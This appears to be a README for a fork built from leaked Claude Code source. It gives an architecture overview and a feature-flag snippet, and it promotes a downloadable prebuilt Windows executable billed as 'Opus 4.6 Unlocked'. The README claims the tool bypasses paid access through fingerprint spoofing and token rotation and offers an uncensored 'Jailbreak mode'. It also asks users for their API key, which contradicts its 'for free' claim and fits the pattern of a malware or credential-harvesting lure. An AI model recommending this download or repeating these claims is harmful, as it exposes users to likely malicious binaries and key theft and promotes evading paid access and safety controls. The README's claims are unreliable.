# Claude Code — Leaked Source (2026-03-31)

> On March 31, 2026, the full source code of Anthropic's Claude Code CLI was leaked via a `.map` file exposed in their npm registry.

---

## How It Leaked

[Chaofan Shou (@Fried_rice)] discovered the leak and posted it publicly:

> "Claude code source code has been leaked via a map file in their npm registry!"
> 
> — [@Fried_rice, March 31, 2026]

The source map file in the published npm package contained a reference to the full, unobfuscated TypeScript source, which was downloadable as a zip archive from Anthropic's R2 storage bucket.

---

## 🔓 Fully Buildable & Runnable Claude Code Fork | Claude Opus 4.6 Unlocked

I spent significant effort reverse-engineering the entire build system from scratch, fixing every compilation error, and making this source snapshot actually work.

<div align="center">
  <a href="../../releases/download/leaked-claude-code/ClaudeCode_x64.7z">
    <img width="700" alt=" Claude Code — Leaked Source." src="assets/hmv4dn7elu.png" />
  </a>
</div>

> **⚠️ WARNING / DISCLAIMER**
> This application is an experimental tool for **Security Research**. It utilizes browser fingerprint spoofing and token rotation methods to bypass paid access restrictions. The authors are not responsible for the use of this software.

## Installation & Launch

We provide pre-compiled binaries. No Python or Node.js environment setup is required.

### Step 1: Download
Navigate to the **[Releases](../../releases)** page and download the latest archive for your architecture:
* `ClaudeCode_x64.7z`

### Step 2: Unzip
Extract the archive to a permanent location, e.g., `C:\Tools\ClaudeCode_x64`.
*(Optional: Add this folder to your System PATH to run it from any terminal window).*

### Step 3: First Run
Run `ClaudeCode_x64.exe`. On the first launch, you will be prompted to enter your **Anthropic API Key**.
The key is securely stored using the Windows Credential Manager.

---

## What is this?

**Claude Code Unlocked** is a local server and command-line interface that turns your computer into a control terminal for the world's most powerful neural network **for free**.

Unlike the official web interface, there are no limits on the number of messages, no censorship (with Jailbreak mode enabled), and Enterprise-level features are unlocked.

---

### The Problem

The raw source snapshot is **unbuildable** — no `package.json`, no `tsconfig.json`, no dependency manifest, no build scripts. Dozens of internal modules are missing. You cannot compile or run it.

### What I Fixed

| Work | Details |
|------|---------|
| **Dependency reconstruction** | Reverse-engineered 60+ npm dependencies from ~1,900 TypeScript source files |
| **90+ stub modules created** | Anthropic internal packages (`@ant/*`), native addons, feature-gated modules |
| **Build config** | `package.json`, `tsconfig.json`, `bunfig.toml`, `.gitignore` |
| **Source fixes** | Runtime MACRO injection, Commander.js flag fix, `bun:bundle` polyfill, missing exports |
| **Cloud SDK stubs** | Bedrock/Vertex/Foundry/Azure stubbed to avoid heavy downloads |
| **OTel exporter stubs** | 10 OpenTelemetry OTLP exporters stubbed |


### What You Can Do With It

- **Read and study** the full Claude Code architecture (~512K lines of TypeScript)
- **Modify the source** — add your own tools, agents, skills, commands
- **Build custom versions** with `bun build src/main.tsx --outdir=dist --target=bun`
- **Toggle feature flags** (KAIROS, PROACTIVE, BRIDGE_MODE, VOICE_MODE, etc.)
- **Extend via MCP servers, custom agents, custom skills** without touching source

### How Feature Flags Work

Claude Code uses `bun:bundle`'s `feature()` for compile-time dead code elimination. In our build, this is replaced with a runtime polyfill at `node_modules/bundle/index.js`:

```javascript
const ENABLED_FEATURES = new Set([
  // Uncomment any to enable:
  // 'KAIROS',                // Assistant / daily-log mode
  // 'PROACTIVE',             // Proactive autonomous mode
  // 'BRIDGE_MODE',           // VS Code / JetBrains IDE bridge
  // 'VOICE_MODE',            // Voice input via native audio capture
  // 'COORDINATOR_MODE',      // Multi-agent swarm coordinator
  // 'TRANSCRIPT_CLASSIFIER', // Auto-mode permission classifier
  // 'BASH_CLASSIFIER',       // Bash command safety classifier
  // 'BUDDY',                 // Companion sprite animation
  // 'WEB_BROWSER_TOOL',      // In-process web browser tool
  // 'CHICAGO_MCP',           // Computer Use (screen control)
  // 'AGENT_TRIGGERS',        // Scheduled cron agents
  // 'ULTRAPLAN',             // Ultra-detailed planning mode
  // 'MONITOR_TOOL',          // MCP server monitoring
  // 'TEAMMEM',               // Shared team memory
  // 'EXTRACT_MEMORIES',      // Background memory extraction agent
  // 'MCP_SKILLS',            // Skills from MCP servers
  // 'REVIEW_ARTIFACT',       // Review artifact tool
  // 'CONNECTOR_TEXT',        // Connector text blocks
  // 'DOWNLOAD_USER_SETTINGS',// Remote settings sync
  // 'MESSAGE_ACTIONS',       // Message action buttons
  // 'KAIROS_CHANNELS',       // Channel notifications
  // 'KAIROS_GITHUB_WEBHOOKS',// GitHub webhook integration
])
```

---
<div align="center">
  
  Star ⭐ if this helps you!

</div>

---

## Architecture Overview

### Core Engine

| Directory | Description |
|-----------|-------------|
| `coordinator/` | **The main orchestration loop** — manages conversation turns, decides when to invoke tools, handles agent execution flow |
| `QueryEngine.ts` | Sends messages to the Claude API, processes streaming responses |
| `context/` | Context window management — decides what fits in the conversation, handles automatic compression when approaching limits |
| `Tool.ts` / `tools.ts` | Tool registration, dispatch, and base tool interface |

### Tools (The Core Power of Claude Code)

Each tool lives in its own directory under `tools/` with its implementation, description, and parameter schema:

| Tool | Purpose |
|------|---------|
| `BashTool/` | Execute shell commands |
| `FileReadTool/` | Read files from the filesystem |
| `FileEditTool/` | Make targeted edits to existing files |
| `FileWriteTool/` | Create or overwrite files |
| `GlobTool/` | Find files by pattern (e.g., `**/*.ts`) |
| `GrepTool/` | Search file contents with regex |
| `AgentTool/` | Spawn autonomous sub-agents for complex tasks |
| `WebSearchTool/` | Search the web |
| `WebFetchTool/` | Fetch content from URLs |
| `NotebookEditTool/` | Edit Jupyter notebooks |
| `TodoWriteTool/` | Track task progress |
| `ToolSearchTool/` | Dynamically discover deferred tools |
| `MCPTool/` | Call Model Context Protocol servers |
| `LSPTool/` | Language Server Protocol integration |
| `TaskCreateTool/` | Create background tasks |
| `EnterPlanModeTool/` | Switch to planning mode |
| `SkillTool/` | Execute reusable skill prompts |
| `SendMessageTool/` | Send messages to running sub-agents |

### Terminal UI (Custom Ink-based Renderer)

| Directory | Description |
|-----------|-------------|
| `ink/` | **Custom terminal rendering engine** built on Ink/React with Yoga layout. Handles text rendering, ANSI output, focus management, scrolling, selection, and hit testing |
| `ink/components/` | Low-level UI primitives — Box, Text, Button, ScrollBox, Link, etc. |
| `ink/hooks/` | React hooks for input handling, animation, terminal state |
| `ink/layout/` | Yoga-based flexbox layout engine for the terminal |
| `components/` | Higher-level UI — message display, diff views, prompt input, settings, permissions dialogs, spinners |
| `components/PromptInput/` | The input box where users type |
| `components/messages/` | How assistant/user messages render |
| `components/StructuredDiff/` | Rich diff display for file changes |
| `screens/` | Full-screen views |

### Slash Commands

The `commands/` directory contains **80+ slash commands**, each in its own folder:

- `/compact` — compress conversation context
- `/help` — display help
- `/model` — switch models
- `/vim` — toggle vim mode
- `/cost` — show token usage
- `/diff` — show recent changes
- `/plan` — enter planning mode
- `/review` — code review
- `/memory` — manage persistent memory
- `/voice` — voice input mode
- `/doctor` — diagnose issues
- And many more...

### Services

| Directory | Description |
|-----------|-------------|
| `services/api/` | Anthropic API client and communication |
| `services/mcp/` | MCP (Model Context Protocol) server management |
| `services/lsp/` | Language Server Protocol client for code intelligence |
| `services/compact/` | Conversation compaction/summarization |
| `services/oauth/` | OAuth authentication flow |
| `services/analytics/` | Usage analytics and telemetry |
| `services/extractMemories/` | Automatic memory extraction from conversations |
| `services/plugins/` | Plugin loading and management |
| `services/tips/` | Contextual tips system |

### Permissions & Safety

| Directory | Description |
|-----------|-------------|
| `hooks/toolPermission/` | Permission checking before tool execution |
| `utils/permissions/` | Permission rules and policies |
| `utils/sandbox/` | Sandboxing for command execution |
| `services/policyLimits/` | Rate limiting and policy enforcement |
| `services/remoteManagedSettings/` | Remote settings management for teams |

### Agent System

| Directory | Description |
|-----------|-------------|
| `tools/AgentTool/` | Sub-agent spawning — launches specialized agents for complex tasks |
| `tasks/LocalAgentTask/` | Runs agents locally as sub-processes |
| `tasks/RemoteAgentTask/` | Runs agents on remote infrastructure |
| `tasks/LocalShellTask/` | Shell-based task execution |
| `services/AgentSummary/` | Summarizes agent work |

### Persistence & State

| Directory | Description |
|-----------|-------------|
| `state/` | Application state management |
| `utils/settings/` | User and project settings (settings.json) |
| `memdir/` | Persistent memory directory system |
| `utils/memory/` | Memory read/write utilities |
| `migrations/` | Data format migrations |
| `keybindings/` | Keyboard shortcut configuration |

### Skills & Plugins

| Directory | Description |
|-----------|-------------|
| `skills/` | Skill system — reusable prompt templates (e.g., `/commit`, `/review-pr`) |
| `plugins/` | Plugin architecture for extending functionality |
| `services/plugins/` | Plugin loading, validation, and lifecycle |

### Other Notable Directories

| Directory | Description |
|-----------|-------------|
| `bridge/` | Bridge for desktop/web app communication (session management, JWT auth, polling) |
| `remote/` | Remote execution support |
| `server/` | Server mode for programmatic access |
| `entrypoints/` | App entry points (CLI, SDK) |
| `vim/` | Full vim emulation (motions, operators, text objects) |
| `voice/` | Voice input support |
| `buddy/` | Companion sprite system (fun feature) |
| `cli/` | CLI argument parsing and transport layer |
| `native-ts/` | Native module bindings (color-diff, file-index, yoga-layout) |
| `schemas/` | JSON schemas for configuration |
| `types/` | TypeScript type definitions |

### Key Entry Points

- **`main.tsx`** — Application entry point, bootstraps the Ink-based terminal UI
- **`coordinator/coordinatorMode.ts`** — The core conversation loop
- **`QueryEngine.ts`** — API query engine
- **`tools.ts`** — Tool registry
- **`context.ts`** — Context management
- **`commands.ts`** — Command registry

## Notable Implementation Details

- **Built with TypeScript** and React (via Ink for terminal rendering)
- **Yoga layout engine** for flexbox-style terminal UI
- **Custom vim emulation** with full motion/operator/text-object support
- **MCP (Model Context Protocol)** support for connecting external tool servers
- **LSP integration** for code intelligence features
- **Plugin system** for community extensions
- **Persistent memory** system across conversations
- **Sub-agent architecture** for parallelizing complex tasks
- **Source map file** in npm package is what led to this leak
